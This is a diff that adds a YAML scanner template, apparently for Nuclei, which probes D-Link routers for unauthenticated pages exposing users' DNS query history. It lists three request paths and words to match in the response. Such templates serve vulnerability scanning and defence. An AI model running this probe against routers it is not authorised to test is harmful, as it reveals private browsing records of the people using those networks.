@@ -1,0 +1,23 @@
+id: D-Link-DNSHistory
+info:
+  name: D-Link routers have some web interfaces without authentication requirements. An attacker can remotely obtain users' DNS query history.
+  author: osamahamad
+  severity: low
+  description: D-Link routers have some web interfaces without authentication requirements. An attacker can remotely obtain users' DNS query history.
+  tags: custom
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/common/get_LogDnsQuery.asp'
+      - '{{BaseURL}}/mydlink/get_LogDnsQuery.asp'
+      - '{{BaseURL}}/get_LogDnsQuery.asp'
+
+    matchers:
+      - type: word
+        words:
+          - "mydlink"
+          - "logdnsquery"
+          - "record"
+        part: body
+        condition: and
